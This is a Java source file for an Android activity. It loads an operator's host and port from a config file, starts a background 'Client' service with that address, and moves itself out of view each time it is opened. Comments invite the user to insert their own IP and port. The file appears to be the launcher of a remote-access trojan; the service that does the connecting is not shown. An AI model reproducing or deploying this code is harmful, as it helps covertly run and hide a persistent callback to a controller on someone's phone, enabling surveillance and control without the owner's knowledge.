package my.app.client;

import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import my.app.client.R;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class LauncherActivity extends Activity
	{
		/** Called when the activity is first created. */

		Intent Client, ClientAlt;
		// Button btnStart, btnStop;
		// EditText ipfield, portfield;
		private String myIp = "127.0.0.1"; // Put your IP in these quotes.
		private int myPort = 9999; // Put your port there, notice that there are no quotes here.

		@Override
		public void onStart()
			{
				super.onStart();
				onResume();
			}

		@Override
		public void onResume()
			{
				super.onResume();
				Client = new Intent(this, Client.class);
				Client.setAction(LauncherActivity.class.getName());
				getConfig();
				Client.putExtra("IP", myIp);
				Client.putExtra("PORT", myPort);

				startService(Client);
				moveTaskToBack(true);
			}

		@Override
		public void onCreate(Bundle savedInstanceState)
			{
				super.onCreate(savedInstanceState);
//				setContentView(R.layout.main);
				Client = new Intent(this, Client.class);
				Client.setAction(LauncherActivity.class.getName());
				getConfig();
				Client.putExtra("IP", myIp);
				Client.putExtra("PORT", myPort);

				startService(Client);
				//moveTaskToBack(true);
			}
		/**
		 * get Config
		 */
		private void getConfig()
			{
				Properties pro = new Properties();
				InputStream is = getResources().openRawResource(R.raw.config);
				try
					{
						pro.load(is);
					} catch (IOException e)
					{
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				myIp = pro.getProperty("host");
				myPort = Integer.valueOf(pro.getProperty("prot"));
				System.out.println(myIp);
				System.out.println(myPort);
			}
	}
